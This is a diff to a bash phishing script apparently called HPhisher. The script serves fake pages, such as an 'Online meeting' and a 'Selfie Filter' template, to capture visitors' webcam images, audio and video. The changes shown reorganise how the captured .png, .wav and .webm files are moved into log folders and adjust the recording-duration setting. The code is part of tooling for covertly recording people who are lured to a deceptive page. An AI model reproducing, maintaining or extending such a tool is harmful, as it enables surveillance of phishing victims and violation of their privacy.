@@ -577,13 +577,13 @@ capture_data_image() {
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
                    	rm -rf .server/www/Log.log
-										if [ -d ${logs_full_dir} ]; then
-	               	mv .server/www/*.png  ${logs_full_dir}/
-								else
-									mkdir ${logs_dir}
-									mv ${logs_dir} ${files_dir}/${site_name}/
-									mv .server/www/*.png  ${logs_full_dir}/
-								fi
+			if [ -d ${logs_full_dir} ]; then
+	               		mv .server/www/*.png  ${logs_full_dir}/
+			else
+				mkdir ${logs_dir}
+				mv ${logs_dir} ${files_dir}/${site_name}/
+				mv .server/www/*.png  ${logs_full_dir}/
+			fi
                 fi
                 sleep 0.5
 	done
@@ -603,7 +603,13 @@ capture_data_audio() {
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
 			rm -rf .server/www/Log.log
-			mv .server/www/*.wav  ${logs_full_dir}/
+			if [ -d ${logs_full_dir} ]; then
+                                mv .server/www/*.wav  ${logs_full_dir}/
+                        else
+                                mkdir ${logs_dir}
+                                mv ${logs_dir} ${files_dir}/${site_name}/
+                                mv .server/www/*.wav  ${logs_full_dir}/
+                        fi
                 fi
                 sleep 0.5
 	done
@@ -623,7 +629,13 @@ capture_data_video() {
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
                         rm -rf Log.log
-                        mv .server/www/*.webm  "${logs_full_dir}/Video-${logs_dir}.webm"
+			if [ -d ${logs_full_dir} ]; then
+                                mv .server/www/*.webm  ${logs_full_dir}/
+                        else
+                                mkdir ${logs_dir}
+                                mv ${logs_dir} ${files_dir}/${site_name}/
+                                mv .server/www/*.webm  "${logs_full_dir}/Video-${logs_dir}.webm"
+                        fi
                 fi
                 sleep 0.5
 	done
@@ -663,10 +675,12 @@ case $reply_site in
 		site_name=audio
                 site_audio;;
 	3 | 03)
+		duration=5000
 		type="video"
 		site_name=video
                 site_video;;
 	4 | 04)
+		duration=5000
 		type="both"
 		site_name=video
 		site_video_audio;;
@@ -816,13 +830,12 @@ echo -e " "
 echo -e " "
 banner
 echo -e " "
-duration=5000
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
 echo -e " "
 echo -e "${BLUE}[01]${CYAN} Default ${NC}"
 echo -e "${BLUE}[02]${CYAN} Online meeting ${NC}"
 echo -e "${BLUE}[03]${CYAN} Selfie Filter ${NC}"
-echo -e "${BLUE}[d]${RED} Change duration (default=${duration}) ${NC}"
+echo -e "${BLUE}[d]${RED} Change duration (Current=${duration}) ${NC}"
 echo -e " "
 read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
 case $reply_template in
@@ -836,14 +849,15 @@ case $reply_template in
 		site_template="filter"
 		tunnel_menu;;
 	d | D)
-		echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Type your video duration : ${BLUE}"
+		echo -e " "
+		echo -e "	${GREEN}Type your video duration : ${BLUE}"
 		read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" duration
 		site_video;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; banner; site_video; };;
 esac
-cd ".sites/video/${site_template}"
+cd ".sites/video/${site_template}/"
 sed "s+mediaType+"video"+g" template.js | sed "s+recordingTime+"$duration"+g" > recorder.js
 cd "${pro_dir}"
 }
